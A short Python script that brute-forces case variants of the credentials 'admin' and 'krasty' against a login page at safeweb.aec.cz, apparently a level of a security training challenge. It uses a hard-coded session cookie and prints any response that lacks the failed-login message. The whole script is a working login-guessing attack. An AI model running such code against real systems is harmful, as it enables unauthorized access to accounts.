import requests, itertools

username = "admin"
password = "krasty"

def generate_capitalized(w):
    r = [w] 
    for letter_cnt in range(1, len(w) + 1):
        comb = itertools.combinations(w, letter_cnt)
        for combination in comb:
            new_word = w
            for letter in combination:
                new_word = new_word.replace(letter, letter.upper())
            r.append(new_word)
    return r

def pretty_print_POST(req):
    """
    At this point it is completely built and ready
    to be fired; it is "prepared".

    However pay attention at the formatting used in 
    this function because it is programmed to be pretty 
    printed and may differ from the actual request.
    """
    print('{}\n{}\r\n{}\r\n\r\n{}'.format(
        '-----------START-----------',
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))

username_mixed = generate_capitalized(username)
password_mixed = generate_capitalized(password)

for i in itertools.product(username_mixed, password_mixed):
    r = requests.post("https://safeweb.aec.cz/level1.php", data = {'login': i[0], 'password': i[1], 'ok': 'Login'}, cookies = {'PHPSESSID': "qe5b0algjlf46tdn3tnjtag2j3"})
    pretty_print_POST(r.request)
    if "Nesprávné jméno nebo heslo" not in r.text:
        print(r.text)
